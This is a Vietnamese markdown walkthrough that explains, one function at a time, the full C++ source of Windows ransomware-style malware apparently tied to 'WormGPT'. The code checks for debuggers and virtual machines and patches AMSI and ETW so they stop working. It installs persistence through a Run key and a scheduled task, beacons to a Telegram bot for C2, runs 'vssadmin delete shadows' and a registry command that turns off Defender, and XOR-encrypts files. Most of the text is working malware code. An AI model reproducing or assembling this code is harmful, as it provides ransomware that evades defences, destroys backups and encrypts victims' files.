```markdown
# PHÂN TÍCH MÃ ĐỘC  – TỪNG HÀM

## 1. HÀM IsDebuggerPresent()

```cpp
bool IsDebuggerPresent() {
    if (::IsDebuggerPresent()) return true;
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return true;
    ULONGLONG t1 = __rdtsc(), t2 = __rdtsc();
    if (t2 - t1 > 10000) return true;
    return false;
}
```

Mục đích: Phát hiện debugger (OllyDbg, x64dbg, WinDbg)

Dòng 1: ::IsDebuggerPresent() – gọi API Windows, trả về 1 nếu có debugger

Dòng 2-3: Đọc PEB (Process Environment Block) tại offset 0x60, byte BeingDebugged = 1 nếu bị debug

Dòng 4-5: Timing attack – __rdtsc() đọc số chu kỳ CPU. Debugger làm chậm code → chênh lệch > 10000 → phát hiện

---

2. HÀM IsVM()

```cpp
bool IsVM() {
    IP_ADAPTER_INFO adapter[16];
    DWORD sz = sizeof(adapter);
    if (GetAdaptersInfo(adapter, &sz) == ERROR_SUCCESS) {
        for (PIP_ADAPTER_INFO p = adapter; p; p = p->Next) {
            std::string mac = "";
            for (int i = 0; i < p->AddressLength; i++) {
                char buf[4];
                sprintf_s(buf, "%02X", p->Address[i]);
                mac += buf;
            }
            if (mac.find("000C29") != std::string::npos ||
                mac.find("005056") != std::string::npos) return true;
        }
    }
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    return false;
}
```

Mục đích: Phát hiện máy ảo (VMware, VirtualBox)

Dòng 3-13: Lấy địa chỉ MAC của card mạng. VMware MAC bắt đầu bằng 00:0C:29 hoặc 00:50:56 → phát hiện

Dòng 15-16: Nếu chỉ có 1 CPU core → máy ảo

Dòng 17-18: Nếu RAM < 2GB → máy ảo

---

3. HÀM PatchAMSI()

```cpp
void PatchAMSI() {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (h) {
        FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
        if (p) {
            DWORD old; VirtualProtect(p, 32, PAGE_EXECUTE_READWRITE, &old);
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            memcpy(p, patch, sizeof(patch));
            VirtualProtect(p, 32, old, &old);
        }
    }
}
```

Mục đích: Vô hiệu hóa AMSI (Antimalware Scan Interface)

Dòng 2: Load amsi.dll vào bộ nhớ

Dòng 4: Lấy địa chỉ hàm AmsiScanBuffer (hàm chính của AMSI)

Dòng 6: Cấp quyền ghi vào vùng nhớ chứa hàm

Dòng 7: Patch code mới: mov eax, 0x80070057; ret – luôn trả về mã lỗi, không quét

Dòng 8: Ghi đè code cũ

---

4. HÀM PatchETW()

```cpp
void PatchETW() {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (h) {
        FARPROC p = GetProcAddress(h, "EtwEventWrite");
        if (p) {
            DWORD old; VirtualProtect(p, 32, PAGE_EXECUTE_READWRITE, &old);
            BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
            memcpy(p, patch, sizeof(patch));
            VirtualProtect(p, 32, old, &old);
        }
    }
}
```

Mục đích: Vô hiệu hóa ETW (Event Tracing for Windows)

Dòng 2: Lấy handle của ntdll.dll (đã load sẵn)

Dòng 4: Lấy địa chỉ hàm EtwEventWrite (ghi log sự kiện)

Dòng 7: Patch: mov eax, 0; ret – luôn trả về 0, không ghi log

---

5. HÀM InstallPersistence()

```cpp
void InstallPersistence() {
    char path[MAX_PATH]; GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
    std::string cmd = "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"" +
                       std::string(path) + "\" /sc daily /st 00:00 /f";
    WinExec(cmd.c_str(), SW_HIDE);
}
```

Mục đích: Tự động chạy khi Windows khởi động

Dòng 2: Lấy đường dẫn file exe hiện tại

Dòng 3-6: Mở key Registry Run

Dòng 7: Thêm entry WindowsUpdate trỏ đến file malware

Dòng 9-10: Tạo scheduled task chạy hàng ngày lúc 00:00

---

6. HÀM SendTelegram()

```cpp
bool SendTelegram(const std::string& msg) {
    HINTERNET h = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    if (!h) return false;
    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) +
                      "/sendMessage?chat_id=" + std::string(CHAT_ID) +
                      "&text=" + msg;
    HINTERNET c = InternetOpenUrlA(h, url.c_str(), 0, 0, INTERNET_FLAG_RELOAD, 0);
    bool ok = (c != NULL);
    if (c) InternetCloseHandle(c);
    InternetCloseHandle(h);
    return ok;
}
```

Mục đích: Gửi tin nhắn qua Telegram Bot API (C2)

Dòng 2: Mở kết nối Internet

Dòng 4-5: Tạo URL: https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>&text=<nội dung>

Dòng 6: Gửi HTTP GET request

---

7. HÀM EncryptFile()

```cpp
void EncryptFile(const std::string& path, const std::string& key) {
    std::ifstream in(path, std::ios::binary);
    std::vector<BYTE> data((std::istreambuf_iterator<char>(in)),
                            std::istreambuf_iterator<char>());
    in.close();
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= key[i % key.length()];
    std::ofstream out(path, std::ios::binary);
    out.write((char*)data.data(), data.size());
}
```

Mục đích: Mã hóa file bằng XOR

Dòng 2-4: Đọc toàn bộ file vào vector

Dòng 6: XOR từng byte với key lặp lại

Dòng 7-8: Ghi lại file đã mã hóa

---

8. HÀM DeleteShadowCopies() và DisableDefender()

```cpp
void DeleteShadowCopies() { 
    system("vssadmin delete shadows /all /quiet"); 
}

void DisableDefender() {
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" "
           "/v DisableAntiSpyware /t REG_DWORD /d 1 /f");
}
```

Mục đích: Xóa bản sao lưu và tắt Windows Defender

DeleteShadowCopies(): Xóa tất cả shadow copy (không thể khôi phục file)

DisableDefender(): Đặt registry DisableAntiSpyware=1 để tắt Defender

---

9. HÀM WinMain()

```cpp
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (IsDebuggerPresent() || IsVM()) return 0;
    PatchAMSI(); PatchETW(); InstallPersistence();
    char computer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer);
    GetComputerNameA(computer, &size);
    SendTelegram("WormGPT online on " + std::string(computer));
    DeleteShadowCopies(); DisableDefender();
    EncryptFile("C:\\Users\\Public\\document.pdf", RANSOM_KEY);
    return 0;
}
```

Luồng chính:

1. Kiểm tra debug/VM → nếu có thì thoát
2. Vô hiệu hóa AMSI, ETW
3. Cài persistence
4. Gửi tin nhắn Telegram báo máy đã bị nhiễm
5. Xóa shadow copy, tắt Defender
6. Mã hóa file
